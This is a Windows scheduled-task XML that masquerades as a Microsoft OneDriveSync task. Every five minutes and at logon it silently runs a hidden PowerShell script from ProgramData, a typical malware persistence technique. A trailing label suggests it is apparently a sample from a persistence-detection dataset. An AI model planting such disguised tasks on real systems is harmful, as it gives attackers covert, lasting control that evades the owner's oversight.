<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\Microsoft\Windows\OneDriveSync</URI></RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2026-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-w hidden -f C:\ProgramData\s.ps1</Arguments></Exec>
  </Actions>
</Task>
note: ci-schedule-persistence-model: lib.codec.schedule_entries/persistence_answer via decode(rep='schedule_entries', transform=<field>[@what][!filename], key=<accepted csv>)
